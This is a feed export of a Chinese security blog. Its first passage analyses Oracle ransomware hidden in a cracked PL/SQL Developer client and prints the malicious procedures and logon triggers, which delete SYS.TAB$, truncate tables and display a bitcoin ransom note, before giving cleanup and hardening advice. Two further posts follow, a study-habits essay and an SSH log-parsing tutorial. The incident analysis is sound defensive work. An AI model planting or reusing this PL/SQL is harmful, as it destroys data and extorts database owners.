class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">create or replace procedure &quot;DBMS_CORE_INTERNAL         &quot; wrapped </span><br><span class="line">a000000</span><br><span class="line">354</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">abcd</span><br><span class="line">7</span><br><span class="line">73c 4c4</span><br><span class="line"></span><br><span class="line">..........对加密数据进行省略..............</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">CREATE OR REPLACE TRIGGER &quot;DBMS_CORE_INTERNAL         &quot;</span><br><span class="line">  AFTER LOGON ON SCHEMA</span><br><span class="line">BEGIN </span><br><span class="line">  &quot;DBMS_CORE_INTERNAL         &quot;;</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p>该文件就是PLSQL客户端的sql文件，文件名为AfterConnect.sql，这个文件官方的软件包中为空（无内容），被篡改过的客户端中包含了连接数据库的恶意代码。</p><p>数据库启动后执行触发器<code>DBMS_SUPPORT_INTERNAL</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_SUPPORT_INTERNAL         &quot; IS  </span><br><span class="line">DATE1 INT :=10;</span><br><span class="line">E1 EXCEPTION;</span><br><span class="line"> PRAGMA EXCEPTION_INIT(E1, -20312);</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-CREATED ),0) INTO DATE1 FROM V$DATABASE;</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">   EXECUTE IMMEDIATE &apos;create table ORACHK&apos;||SUBSTR(SYS_GUID,10)||&apos; tablespace system  as select * from sys.tab$&apos;;</span><br><span class="line">   DELETE SYS.TAB$ WHERE DATAOBJ# IN (SELECT DATAOBJ# FROM SYS.OBJ$ WHERE OWNER# NOT IN (0,38)) ;</span><br><span class="line">   COMMIT;</span><br><span class="line">   </span><br><span class="line">............省略.................</span><br><span class="line"></span><br><span class="line">   FOR I IN 1..2046 LOOP</span><br><span class="line">   DBMS_SYSTEM.KSDWRT(2, &apos;Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">   DBMS_SYSTEM.KSDWRT(2, &apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库 &apos;);</span><br><span class="line">   END LOOP;</span><br><span class="line">   RAISE E1;</span><br><span class="line">   END IF;</span><br><span class="line">   EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20312,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    NULL;</span><br><span class="line">END;</span><br></pre></td></tr></table></figure><p><strong>该文件的作用</strong></p><ul><li>当数据库文件创建大于1200天，就开始备份<code>TAB$表</code>。</li><li>删除<code>TAB$</code>中除<code>OWNER#</code>为(0,,38)的记录。</li><li>通过<code>SYS.DBMS_BACKUP_RESTORE.RESETCFILESECTION</code>清除备份信息。</li><li>然后通过<code>DBMS_SYSTEM.KSDWRT</code>在你的alert日志中写入2046次提示信息。</li><li>在抛出一个前台类似的信息。</li></ul><p><strong>数据库登录触发器<code>DBMS_SYSTEM_INTERNAL</code> </strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_SYSTEM_INTERNAL         &quot; IS</span><br><span class="line">  DATE1 INT :=10;</span><br><span class="line">  E1 EXCEPTION;</span><br><span class="line">  PRAGMA EXCEPTION_INIT(E1, -20313);</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;);</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">    IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;)</span><br><span class="line">     THEN</span><br><span class="line">      RAISE E1;</span><br><span class="line">    END IF;</span><br><span class="line">    END IF;</span><br><span class="line">EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20313,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    NULL;</span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line">............省略.................</span><br></pre></td></tr></table></figure><blockquote><p>该文件的作用</p></blockquote><ul><li>当你的非<code>SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;</code>之外的所有表的最小统计时间为1200天，并且非<code>C89239.EXE</code>程序,将对数据库进行锁定，提示<code>你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.</code>。</li></ul><p><strong>数据库触发器<code>DBMS_CORE_INTERNAL</code></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PROCEDURE &quot;DBMS_CORE_INTERNAL         &quot; IS</span><br><span class="line">  V_JOB   NUMBER;</span><br><span class="line">  DATE1 INT :=10;</span><br><span class="line">  STAT VARCHAR2(2000);</span><br><span class="line">  V_MODULE VARCHAR2(2000);</span><br><span class="line">  E1 EXCEPTION;</span><br><span class="line">  PRAGMA EXCEPTION_INIT(E1, -20315);</span><br><span class="line">  CURSOR TLIST IS SELECT * FROM USER_TABLES WHERE TABLE_NAME NOT LIKE &apos;%$%&apos; AND TABLE_NAME NOT LIKE &apos;%ORACHK%&apos; AND CLUSTER_NAME IS NULL;</span><br><span class="line">BEGIN</span><br><span class="line">   SELECT NVL(TO_CHAR(SYSDATE-MIN(LAST_ANALYZED)),0) INTO DATE1 FROM ALL_TABLES WHERE TABLESPACE_NAME NOT IN (&apos;SYSTEM&apos;,&apos;SYSAUX&apos;,&apos;EXAMPLE&apos;);</span><br><span class="line">   IF (DATE1&gt;=1200) THEN</span><br><span class="line">    FOR I IN TLIST LOOP</span><br><span class="line">    DBMS_OUTPUT.PUT_LINE(&apos;table_name is &apos; ||I.TABLE_NAME);</span><br><span class="line">    STAT:=&apos;truncate table &apos;||USER||&apos;.&apos;||I.TABLE_NAME;</span><br><span class="line">    DBMS_JOB.SUBMIT(V_JOB, &apos;DBMS_STANDARD_FUN9(&apos;&apos;&apos; || STAT || &apos;&apos;&apos;);&apos;, SYSDATE);</span><br><span class="line">    COMMIT;</span><br><span class="line">    END LOOP;</span><br><span class="line">    END IF; </span><br><span class="line">        IF (UPPER(SYS_CONTEXT(&apos;USERENV&apos;, &apos;MODULE&apos;))!=&apos;C89239.EXE&apos;)</span><br><span class="line">     THEN</span><br><span class="line">      RAISE E1;</span><br><span class="line">    END IF;</span><br><span class="line"></span><br><span class="line">EXCEPTION</span><br><span class="line">  WHEN E1 THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);</span><br><span class="line">  WHEN OTHERS THEN</span><br><span class="line">    RAISE_APPLICATION_ERROR(-20315,&apos;你的数据库已被SQL RUSH Team锁死  发送5个比特币到这个地址 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (大小写一致)  之后把你的Oracle SID邮寄地址 sqlrush@mail.com 我们将让你知道如何解锁你的数据库  Hi buddy, your database was hacked by SQL RUSH Team, send 5 bitcoin to address 166xk1FXMB2g8JxBVF5T4Aw1Z5JaZ6vrSE (case sensitive),  after that send your Oracle SID to mail address sqlrush@mail.com, we will let you know how to unlock your database.&apos;);    </span><br><span class="line">END;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">............省略.................</span><br></pre></td></tr></table></figure><p>该文件的作用</p><ul><li>将表明不含<code>$</code>、不含<code>ORACHK</code>的表放到一个游标里面，当你的非<code>SYSTEM&#39;,&#39;SYSAUX&#39;,&#39;EXAMPLE&#39;</code>之外的所有表的最小统计时间为1200天就执行执行<code>truncate table</code>操作，并且登录程序非<code>C89239.EXE</code>程序,则报出异常。</li></ul><h2 id="勒索病毒如何感染数据库？"><a href="#勒索病毒如何感染数据库？" class="headerlink" title="勒索病毒如何感染数据库？"></a>勒索病毒如何感染数据库？</h2><blockquote><p>根据勒索病毒特性，进一步分析，由于运维人员使用绿色版<code>PLSQL Developer 11.06中文绿色注册版(免Oracle11g客户端)</code>，然后连接数据库，导致数据库内被自动注入存储过程、触发器以及几千万个JOBS。</p></blockquote><blockquote><p>大家都清楚，绿色版的软件也称作破解软件，破解人员对官方软件进行修改之后重新发布的，如果你没有用正版软件的习惯，习惯下载破解软件，而不验证软件有无恶意，很容易中招。在这里也提醒大家，尽量使用正版软件，验证来源软件的签名，特别是在连接客户的真实环境的情况下，接触重要数据的情况下。</p></blockquote><h2 id="如何对数据进行恢复"><a href="#如何对数据进行恢复" class="headerlink" title="如何对数据进行恢复"></a>如何对数据进行恢复</h2><blockquote><p>客户发现的及时，并未对生成库造成锁定的影响，这时我们还是可以恢复的，通过清除勒索软件产生的垃圾数据，并通过备份进行数据还原，可以及时对数据进行恢复。（建议先在测试环境中，先进行测试，测试环境成功之后，再在生产系统中操作。）</p></blockquote><p>1、<code>alter system set job_queue_process=0 scope=both ;</code>并重启<code>db</code>。重启是由于此时数据库存在大量的<code>library cache lock</code>，无法操作。</p><p>2、删除上述的存储过程和触发器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">drop trigger xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;</span><br><span class="line">drop trigger xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;</span><br><span class="line">drop trigger xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;</span><br><span class="line"> </span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_CORE_INTERNAL         &quot; ;</span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_SUPPORT_INTERNAL         &quot; ;</span><br><span class="line">drop PROCEDURE xxx.&quot;DBMS_SYSTEM_INTERNAL         &quot; ;</span><br></pre></td></tr></table></figure><p><strong>注意后面的九个空格(x为空格)（<code>DBMS_SYSTEM_INTERNALxxxxxxxxx</code>）</strong></p><p>3、删除黑客创建的大量jobs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &apos;exec dbms_ijob.remove(&apos;||job||&apos;);&apos; </span><br><span class="line">from xxx </span><br><span class="line">where schema_user=&apos;xxx&apos; and what like &apos;%truncate%&apos;;</span><br></pre></td></tr></table></figure><p>4、确认被truncate的表，确认数据是否丢失。</p><p>5、如果测试环境测试正常，可以对生成数据库进行同样的操作。</p><h2 id="残余风险"><a href="#残余风险" class="headerlink" title="残余风险"></a>残余风险</h2><ul><li>删除job记录可能导致某些数据不能读取或丢失。</li><li>不能完全确认是否还有运维开发人员在使用带有勒索病毒的PLSQL Developer客户端。</li><li>数据库管理权限不分明，DDL操作审核不严格。</li></ul><h2 id="安全建设建议"><a href="#安全建设建议" class="headerlink" title="安全建设建议"></a>安全建设建议</h2><ul><li>在业务恢复之后，对关键资产、代码进行安全检查，扫描非法程序、高风险操作代码，及时排除残留风险。</li><li>在日常的运维管理中，通过制度和运维管理平台对运维管理人员的操作进行记录并审计，使用客户提供的终端和工具对数据库进行操作。</li><li>管理数据库的运维管理工具应从官方的渠道下载，在使用前需要对管理工具进行检测，禁止使用盗版工具对数据库进行操作。</li><li>建议建立健全关键资产管控，敏感资产管控，高风险操作管控，特权用户操作管控，同时对运维人员的DDL审核，并对可以创建触发器、存储过程的行为进行审核及管控，防止非法程序侵入。</li><li>建议建立健全灾备系统，相关备份策略、恢复测试流程、恢复测试案例。</li><li>定期进行容灾演练、场景演练、恢复测试、入侵用例恢复测试，尽可能缩短恢复时间</li></ul><p><strong><code>参考：</code></strong></p><p><a href="http://www.killdb.com/2017/02/12/%E6%AF%94%E7%89%B9%E5%B8%81%E6%94%BB%E5%87%BB%E6%A1%88%E4%BE%8B%E9%87%8D%E7%8E%B0%E6%B1%9F%E6%B9%96.html" target="_blank" rel="noopener">比特币攻击案例重现江湖</a></p><p><a href="http://www.xifenfei.com/2016/11/plsql-dev-hacker-bitcoin.html" target="_blank" rel="noopener">plsql dev引起的数据库被黑勒索比特币实现原理分析和解决方案</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/1519886469360.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://airs-sec.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="勒索软件" scheme="http://airs-sec.com/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>生活归于平静，学习才能静下心</title>
    <link href="http://airs-sec.com/2018/02/06/%E7%94%9F%E6%B4%BB%E5%BD%92%E4%BA%8E%E5%B9%B3%E9%9D%99%EF%BC%8C%E5%AD%A6%E4%B9%A0%E6%89%8D%E8%83%BD%E9%9D%99%E4%B8%8B%E5%BF%83/"/>
    <id>http://airs-sec.com/2018/02/06/生活归于平静，学习才能静下心/</id>
    <published>2018-02-06T08:37:45.000Z</published>
    <updated>2018-02-06T08:47:41.090Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/wallhaven-40967.jpg" alt="enter description here" title="wallhaven-40967"></p><p><code>这篇文章是我2014/6/5写的，当时刚考完软考，之后对自己的学习进行的一个总结，现在翻出来看看，感慨万千。</code></p><a id="more"></a><p><code>软考考完了，不知道结果怎样呢！但不管怎样自己都去努力过了，我也就无怨无悔了。</code></p><p><code>考完之后，感觉比较的轻松了，但又是一个重要的分水岭，就是这之后该怎样的去对待自己的学习，是像以前那样呢！还是改变以前的那种学习方法呢！我想在这里我自己有必要总结一下自己在这个过程学习的经验，为自己更在努力的的前提下，更加有效率的学习，规避自己在短的时间内做太多的无用功。</code></p><p><code>学习是永远没有尽头的，同时，时间也是有限的，在有限的时间内去学到更多的东西，是在这个社会活下去的重要的法则。</code></p><p><code>下面就列出在学习的过程的如何提高自己效率的方法，这个方法是自己这一路走来的心血，或许在这个过程中自己走了太多的弯路了，但人谁又不是这样的走过来呢！</code></p><p><code>所以，在这个过程中，不要对自己太埋怨了，只要按照自己的想法了就可以了！不必太去在意别人的看法，你又不是为了谁去活。</code></p><p><code>活着总是要归于平静的，认真想想下就是那个道理了。</code></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p><code>最重要的就是思考，任何东西没有自己的成分永远不是自己的东西，要用自己的思考去考量一件事，尽管有些时候是错的，也不要去放弃自己思考的权利。</code></p><p><code>一个知识点，一个学习方法，总有它自己的规律的，只要想出它的规律来，就可以了。</code></p><h2 id="模仿"><a href="#模仿" class="headerlink" title="模仿"></a>模仿</h2><p><code>在这个科技日益发展的今天，太多的东西充斥着你了，令你来不及反应。所以我们要在思考的前提下，去学会怎样去模仿别人的东西，不要老想着自己笨，自己就想不出来呢！有的时候真的会陷入自己的给自己设的圈中去，令自己久久处于苦恼之中.</code></p><p><code>胡适先生说过，会创造的的必定敏与模仿，我想这句话是有它的道理的。所以我们要去分析他人的那种方法，不能去闭门造车，那只会自己痛苦而已，要善于学习他人，不能一味的以为自己就是最厉害的，这世界上厉害的人多着呢！</code></p><h2 id="耐心"><a href="#耐心" class="headerlink" title="耐心"></a>耐心</h2><p><code>一个没有耐心的人做什么事情都只会半途而废的.</code></p><h2 id="总结方法"><a href="#总结方法" class="headerlink" title="总结方法"></a>总结方法</h2><p><code>一件事做完之后要用自己的想法去总结这件事的意义，给你带来的收获。自己在这件事上犯了什么错，什么是对的，以后该如何改正，该如何做的更好。</code></p><p><code>不要一件事过了就过了，在自己的心底没有任何的记忆。</code></p><h2 id="良好的生活习惯"><a href="#良好的生活习惯" class="headerlink" title="良好的生活习惯"></a>良好的生活习惯</h2><p><code>养成一个良好的生活习惯，可以提高自己的做事效率，也可以让自己过得更充实。</code></p><h2 id="一个好的态度"><a href="#一个好的态度" class="headerlink" title="一个好的态度"></a>一个好的态度</h2><p><code>抱着一颗良好的学习态度。</code></p><h2 id="该怎样对待自己的感情"><a href="#该怎样对待自己的感情" class="headerlink" title="该怎样对待自己的感情"></a>该怎样对待自己的感情</h2><p><code>也许这是最重要的吧！但，这是最重要的吗~不要每次都想着自己是世界上最最伤心的人，不要把自己的感情强加在他人的身上。</code></p><h2 id="持一颗平淡的心"><a href="#持一颗平淡的心" class="headerlink" title="持一颗平淡的心"></a>持一颗平淡的心</h2><p><code>一颗不为什么事而动摇的心。</code></p><h2 id="不要为了自己的侥幸想法而自豪"><a href="#不要为了自己的侥幸想法而自豪" class="headerlink" title="不要为了自己的侥幸想法而自豪"></a>不要为了自己的侥幸想法而自豪</h2><h2 id="不要想着自己总要别人想着"><a href="#不要想着自己总要别人想着" class="headerlink" title="不要想着自己总要别人想着"></a>不要想着自己总要别人想着</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/wallhaven-40967.jpg&quot; alt=&quot;enter description here&quot; title=&quot;wallhaven-40967&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;这篇文章是我2014/6/5写的，当时刚考完软考，之后对自己的学习进行的一个总结，现在翻出来看看，感慨万千。&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://airs-sec.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>从linux服务器的日志文件中提取有用信息</title>
    <link href="http://airs-sec.com/2018/01/30/%E4%BB%8Elinux%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%B8%AD%E6%8F%90%E5%8F%96%E6%9C%89%E7%94%A8%E4%BF%A1%E6%81%AF/"/>
    <id>http://airs-sec.com/2018/01/30/从linux服务器的日志文件中提取有用信息/</id>
    <published>2018-01-30T03:56:34.000Z</published>
    <updated>2018-01-30T04:46:17.651Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/wallhaven-442708.jpg" alt="enter description here" title="wallhaven-442708"></p><a id="more"></a><hr><h1 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a><strong>第一部分</strong></h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>系统管理员每天忙绿于工作当中，当系统出现问题时，需要解决和回答各种各样的问题。经常被问到的题目是：某某设备执行某某命令的次数。这些信息通常不是直接存储的，大多数linux服务器灭有计数器或者专门的统计页面。但是，linux有日志文件，每次请求网页、发送电子邮件或登录操作系统的事件都会记录在日志文件中。对于任何系统管理员来说，一项基本的技能就是能够通过日志文件解析并提取有用的信息。</p><p>下面将引导你从日志文件中提取有用的信息，对信息进行排序和计数，最后构建一个bash循环，更方便的去执行批量化脚本。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><blockquote><p>统计未经授权的SSH登录尝试失败/成功的次数。</p></blockquote><h2 id="0x01-目标文件"><a href="#0x01-目标文件" class="headerlink" title="0x01 目标文件"></a>0x01 目标文件</h2><ul><li>解析记录SSH连接尝试的日志文件，确定所有登录失败的行</li><li>使用gerp、awk、cut提取尝试登录的ip并记录到文件中</li><li>最后，获取登录的ip地</li></ul><h3 id="获取日志文件"><a href="#获取日志文件" class="headerlink" title="获取日志文件"></a>获取日志文件</h3><blockquote><p>不同的发行版的SSH记录到不同的文件当中</p></blockquote><ul><li>Ubuntu/Debian:/var/log/auth.log</li><li>Redhat:/var/log/secure</li></ul><blockquote><p>这里使用的操作系统为centos</p></blockquote><h3 id="获取ip"><a href="#获取ip" class="headerlink" title="获取ip"></a>获取ip</h3><p>通过管道符进行过滤。</p><p>1）从日志文件中筛选出我们的行</p><p>/var/log/secure日志文件包含大量的信息。这是因为所有的身份验证事件都与CRON事件和其他信息都一起写入该文件。另外，每个SSH登录事件写入多行并且有多种类型的SSH登录尝试需要考虑。</p><blockquote><p>两种不同类型的登录失败的SSH记录事件。</p></blockquote><p>1、无效用户，服务器上不存在的用户<br>2、有效用户，服务器上存在的用户但密码不正确</p><p>第一种类型的登录记录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: input_userauth_request: invalid user guest [preauth]</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=193.201.224.218</span><br><span class="line">Aug 23 03:47:15 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:16 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:17 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:18 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:20 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:24 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:25 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:26 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:27 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:27 centos7 sshd[3283]: pam_unix(sshd:auth): check pass; user unknown</span><br><span class="line">Aug 23 03:47:29 centos7 sshd[3283]: Failed password for invalid user guest from 193.201.224.218 port 13181 ssh2</span><br><span class="line">Aug 23 03:47:29 centos7 sshd[3283]: Disconnecting: Too many authentication failures for guest [preauth]</span><br></pre></td></tr></table></figure><p>这里显示的是，ip：193.281.224.219以用户guest启动ssh连接，ssh记录这个用户是无效的，即在服务器上不存在，然而，193.281.224.219直接尝试密码登录，直到达到最大的尝试登录次数，ssh并终止连接。</p><p>从上面的记录中发现提取的日志还是比较多，我们需要精简输出，需要找出一行有特色的一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:47:13 centos7 sshd[3283]: Invalid user guest from 193.201.224.218</span><br></pre></td></tr></table></figure><blockquote><p>开始过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Invalid user&quot; /var/log/secure</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>输出如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 03:52:40 centos7 sshd[5160]: Invalid user acc from 193.201.224.218</span><br><span class="line">Aug 23 03:52:45 centos7 sshd[5243]: Invalid user adam from 193.201.224.218</span><br><span class="line">Aug 23 03:52:53 centos7 sshd[5312]: Invalid user adfexc from 193.201.224.218</span><br><span class="line">Aug 23 03:53:45 centos7 sshd[5494]: Invalid user admin2 from 193.201.224.218</span><br><span class="line">etc</span><br></pre></td></tr></table></figure><p>上述，正是我们需要的，每一行只针对每一个不同用户的登录尝试信息，包含了攻击者的ip并且不显示其他的任何行。</p><p>下面过滤出第二种类型的日志记录，使用了有效的用户名，但密码错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Aug 23 05:08:08 centos7 sshd[5185]: reverse mapping checking getaddrinfo for 123.30.65.218.broad.xy.jx.dynamic.163data.com.cn [218.65.30.123] failed - POSSIBLE BREAK-IN ATTEMPT!</span><br><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=218.65.30.123  user=root</span><br><span class="line">Aug 23 05:08:09 centos7 sshd[5185]: pam_succeed_if(sshd:auth): requirement &quot;uid &gt;= 1000&quot; not met by user 